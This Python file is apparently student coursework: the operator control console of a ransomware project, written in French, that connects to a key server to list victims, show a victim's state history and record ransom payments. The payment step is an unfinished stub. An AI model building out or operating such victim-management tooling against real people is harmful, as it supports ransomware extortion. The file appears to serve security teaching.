# --------------------------------------------

# Ransomware Project for educational purposes
# Course : Security integration
# Bloc : 1
# Group : IS4
# Class : main

# --------------------------------------------
import socket
from socket import SHUT_RDWR
import utile.configgetter as config
def main():
    """ Console de contrôle """
    # Key server start
    print('CONSOLE DE CONTRÔLE'
          '\n==================='
          '\n1) Liste des victimes du ransomware'
          '\n2) Historique des états d''une victime'
          '\n3) Renseigner le paiement de rançon d''une victime'
          '\n4) Quitter')
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((config.get_ip("config.json"), config.get_port("config.json")))
    choix = "19"
    while choix != '4':
        choix = input('Votre choix : ')
        if choix == '1':
            s.send(bytes("1", 'utf-8'))
            data = s.recv(1024).decode()
            print('Réception de données de la part du serveur : ' + str(data))
        elif choix == '2':
            s.send(bytes("2", 'utf-8'))
            data = s.recv(1024).decode()
            print('Réception de données de la part du serveur : ' + str(data))
            id = input('Merci de préciser un ID pour consulter l''historique : ')
            s.send(bytes(id, 'utf-8'))
            data_h = s.recv(1024).decode()
            print('Réception de données de la part du serveur : ' + str(data_h))
        elif choix == '3':
            # Todo Fill payload
            print(fill_payload())
        elif choix == '4':
            print('Bonne journée')
            s.send(bytes("The connexion has been closed", 'utf-8'))
            break
    s.close()

def fill_payload():
    return 'Todo payload'


def quit():
    return 'Bonne journée'


if __name__ == '__main__':
    main()
